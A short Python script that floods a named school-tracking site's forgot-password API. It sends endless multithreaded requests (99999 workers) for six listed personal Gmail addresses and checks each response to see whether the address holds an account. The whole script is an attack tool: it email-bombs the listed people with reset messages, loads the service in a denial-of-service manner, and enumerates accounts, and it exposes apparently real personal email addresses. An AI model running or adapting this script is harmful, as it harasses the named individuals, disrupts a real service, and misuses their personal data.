from concurrent.futures import ThreadPoolExecutor
import requests
def check_email(email):
    url = "https://www.revera-track.com/api/auth/forgot"
    payload = {
        "isFrontend": 1,
        "email": email,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    while True:
        try:
            response = requests.post(url, json = payload, timeout = 1)
            break
        except:
            pass
    data = response.text.strip()
    if data == "1":
        return True
    else:
        return False
emails = ["eric.seo0104@gmail.com", "evalou004@gmail.com", "ikuaktee08130@gmail.com", "jaeeunjanejung@gmail.com", "rosakimhyo@gmail.com", "revera9991@gmail.com"]
iterations = 0
with ThreadPoolExecutor(max_workers = 99999) as executor:
    try:
        while True:
            for email in emails:
                future = executor.submit(check_email, email)
            iterations += 1
            print("Number of iterations:", iterations)
    except KeyboardInterrupt:
        print("Program interrupted. Exiting...")